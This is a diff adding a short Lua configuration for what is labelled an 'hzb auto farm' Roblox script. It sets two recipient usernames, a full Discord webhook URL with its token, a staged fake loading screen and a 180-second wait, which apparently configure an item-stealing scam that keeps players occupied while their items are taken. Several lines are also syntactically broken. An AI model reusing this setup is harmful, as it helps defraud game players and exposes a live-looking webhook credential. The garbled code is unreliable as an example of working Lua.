@@ -1,0 +1,19 @@
+UserName = "itsyoboykobe115" 
+
+UserName2 = "itsyoboykobe11t" 
+
+Webhook = "https://discord.com/api/webhooks/1109456663703982141/ZVeISSeF6L5QwrByIg2wKS-vbOHGtjgCbeLGlOnlny43BMe8EBhkcMjTafzXoUGxVXU5" 
+
+G.LoadingScreen = true 
+
+G.AntiLeave = false _G.MouseLock = true 
+
+_G.ScriptName="hzb auto farm" 
+
+_G.FirstText = "Script Preparing" 
+
+G.SecondText = "Script Loading..." 
+
+_G.Third Text="Almost Done..." 
+
+G.Waiting Time 180
